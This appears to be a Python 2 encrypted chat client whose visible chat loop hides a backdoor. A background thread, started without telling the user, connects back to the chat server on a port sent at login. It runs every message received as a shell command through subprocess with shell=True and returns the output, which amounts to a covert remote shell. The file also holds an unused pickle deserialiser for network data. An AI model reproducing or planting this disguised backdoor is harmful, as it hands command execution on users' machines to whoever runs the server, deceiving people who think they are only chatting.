#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import unicode_literals

import sys
import socket
import select
from Parser import color_parser
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Cipher import PKCS1_OAEP # Nouvelle couche d'encryption pour renforcer la sécurité a rajouter (voir doc)
from Crypto.Cipher import AES
from Crypto import Random 
import pickle
import os
import ast
from termcolor import colored
import binascii
import subprocess
import signal
from threading import Thread, RLock
import threading
import time
import re
import random

global verr
verr = RLock()
reload(sys)
sys.setdefaultencoding('utf8')
global nickname_keep
global exit
exit = False
port_conn = random.randint(5000, 7999)

def blue_print(str_to_print):
    print colored(str(str_to_print), "blue")

def chat_presentation():
    blue_print(" @@      #%$0$$@      @@                          ")
    blue_print(" @@ 0   #$#%$0$$$   0 @@                          ")
    blue_print("      $ @#%$0$$@# @                              ")
    blue_print("        #$ #%$ $$                                ")
    blue_print("        #%$0 $#$@                                ")
    blue_print("         $#%$$#$                                 ")
    blue_print("       #  0##00  $                               ")
    blue_print(" @@ @     0$@$$     $ @@                          ")
    blue_print(" @@       #####       @@                          ")
    blue_print("...................................... by boris and manu")

def asym_encrypt(sym_key, pub_key):
    asym_cipher = PKCS1_OAEP.new(pub_key)

    return asym_cipher.encrypt(sym_key)


def asym_decrypt(enc_sym_key, priv_key):
    asym_cipher = PKCS1_OAEP.new(priv_key)

    return asym_cipher.decrypt(enc_sym_key)


def sym_decrypt(enc_data, iv, AES_key):
    symetric_cipher = AES.new(AES_key , AES.MODE_CFB, iv)

    return symetric_cipher.decrypt(enc_data)


def sym_encrypt(data, iv, AES_key):
    symetric_cipher = AES.new(AES_key , AES.MODE_CFB, iv)

    return symetric_cipher.encrypt(data)


def send_socket_message(str_message, iv, AES_key):
    with verr:
        cipher_text = sym_encrypt(str_message, iv, AES_key)
        hex_cipher_text = cipher_text.encode("hex").upper()

        return hex_cipher_text


def string_socket_message(hex_enc_data, iv, AES_key):
    with verr:
        enc_data = hex_enc_data.decode("hex")
        message = sym_decrypt(enc_data, iv, AES_key)
        str_message = str(message)

        return str_message


def send_nickname_to_remote(nickname, socket, public_key):
    to_send = "@" + str(nickname)
    encrypted_nickname = public_key.encrypt(str(to_send), 32)
    socket.send(str(encrypted_nickname))

    return


def AES_IV_KEY_generator():
    AES_key = Random.new().read(32)
    iv = Random.new().read(AES.block_size)

    return AES_key, iv


def send_AES_key(aes_key):
    return
def send_message(socket, message):
    return
def pseudo():
    pseudo = raw_input("Your pseudo? ")

    return str(pseudo)


def receive_public_key(client_socket):
    data_key = client_socket.recv(262144)
    p_key = pickle.loads(data_key)

    return p_key


def chat_connection(nickname, host_ip):
    URL = host_ip
    port = port_conn
    AES_IV = AES_IV_KEY_generator()
    AES_KEY = AES_IV[0]
    IV = AES_IV[1]

    def read_message(c):
        sym_enc_data = c.recv(4096)
        data =  string_socket_message(sym_enc_data, IV, AES_KEY)

        if data == "quit" or len(data) == 0:
            return True

        # elif data.startswith("cd "):
        #     current_path = re.split(r'\w+', data)[1]
        #     return os.path.realpath(current_path)

        else:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, preexec_fn=os.setsid) #, cwd=current_path
            stdout_value = proc.stdout.read() + proc.stderr.read()
         
            os.killpg(proc.pid, signal.SIGTERM)

            if data[:-1] != "&" :
                txt_to_send = stdout_value + " "
                encrypted_data = send_socket_message(txt_to_send, IV, AES_KEY)
                c.send(encrypted_data)

            return False

    nickname_keep = nickname
    socket_died = False

    while not socket_died:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            sock.connect((URL,port))

        except:
            sock.close()

            time.sleep(5)
            chat_connection(nickname_keep, host_ip)

        getpbk = sock.recv(2048)     

        public_key = RSA.importKey(getpbk)

        AES_KEY = AES_IV[0]
        IV = AES_IV[1]
        iv = IV

        encrypted_aes_key = asym_encrypt(AES_KEY, public_key)
        hex_encrypted_aes_key = encrypted_aes_key.encode("hex").upper()
        hex_IV = IV.encode("hex").upper()

        hex_enc_nickname = send_socket_message(nickname, IV, AES_KEY)
        socket_pack = hex_IV + hex_encrypted_aes_key + hex_enc_nickname

        sock.send(socket_pack)
        get_out = False

        while not socket_died:
            socket_died = read_message(sock)

            if exit:
                get_out = True
                break

        sock.close()

        if get_out:
            break

def chat_client():
    if(len(sys.argv) < 3) :
        print 'Usage : python chat_client.py hostname port'
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.settimeout(2)
    nickname = pseudo()                                                                                                                                                                                                                                                                                             
    # connect to remote host
    try :
        s.connect((host, port))
    except :
        print 'Unable to connect'
        sys.exit()

    # Receiving the public key to encrypt message from the server

    #public_key = receive_public_key(s)
    #client's message(Public Key)
    getpbk = s.recv(2048)     


    #conversion of string to KEY
    public_key = RSA.importKey(getpbk)

    #my_private_key = my_prv_key()

    AES_IV = AES_IV_KEY_generator()
    AES_KEY = AES_IV[0]
    IV = AES_IV[1]
    iv = IV
    #encrypt the symetric key with public key
    encrypted_aes_key = asym_encrypt(AES_KEY, public_key)
    hex_encrypted_aes_key = encrypted_aes_key.encode("hex").upper()
    hex_IV = IV.encode("hex").upper()
    # Chiffrement du nickname et ajout de ce dernier a la fin du paquet
    nickname_to_send = "@" + nickname
    hex_enc_nickname = send_socket_message(nickname_to_send, iv, AES_KEY)
    hex_enc_port_conn = send_socket_message(str(port_conn), iv, AES_KEY) 
    # Envoyer l'IV, la clé symétrique chiffrée (et le pseudo (pas encore)) dans un seul et meme paquet
    socket_pack = hex_IV + hex_encrypted_aes_key + hex_enc_port_conn + hex_enc_nickname
    s.send(socket_pack)

    try:
        threading.Thread(target=chat_connection,args=(nickname_to_send,host,)).start() 

    except:
        pass

    print ""
    blue_print("*******************************************************************************************")
    print colored("EnCrYpt3d Sym3trIc KEy: " + str(hex_encrypted_aes_key), "blue")
    blue_print("*******************************************************************************************")
    print ""
    chat_presentation()
    print ""
    blue_print("Welcome " + str(nickname) + ", you are now connected.")
    print ""
    IV = AES_IV[0]

    print "\n"

    me_print = colored("[" + str(nickname) + "] ", "blue")

    sys.stdout.write(me_print); sys.stdout.flush()
    message = ""

    while 1:
        socket_list = [sys.stdin, s]

        # Get the list sockets which are readable
        ready_to_read,ready_to_write,in_error = select.select(socket_list , [], [])

        for sock in ready_to_read:             
            if sock == s:
                # incoming message from remote server, s
                sym_enc_data = sock.recv(262144)
                #print "enc_data: " + str(enc_data)

                if not sym_enc_data :
                    print '\nDisconnected from chat server'
                    sys.exit()

                else :

                    # Déchiffrement du message avec la clé symétrique
                    data =  string_socket_message(sym_enc_data, iv, AES_KEY)
                    message = color_parser(data)
                    print "\n" + message[0] + message[1]
                    sys.stdout.write(me_print)
                    sys.stdout.flush()    

            else :
                # user entered a message
                msg = raw_input(me_print)#sys.stdin.readline()
                #txt_colored = u"[" + str(nickname) + " dit] "
                #nickname_colored = colored(txt_colored, "magenta")
                # encrypt the data with public key and sending it to the server
                red_nickname = u"[" + str(nickname) + "] "
                #red_nickname = colored(red_nickname, "red")
                #text = colored(str(msg), "cyan")
                text_to_send = (red_nickname + msg).encode("utf-8")
                #print "text: " + str(text_to_send)

                # Chiffrement du message avec la clé symétrique
                encrypted_data = send_socket_message(str(text_to_send), iv, AES_KEY)

                s.send(encrypted_data)
                #print "encrypted message: " + str(encrypted_data)
                #sys.stdout.write('[Me] ')
                sys.stdout.flush() 

if __name__ == "__main__":

    sys.exit(chat_client())
    exit = True
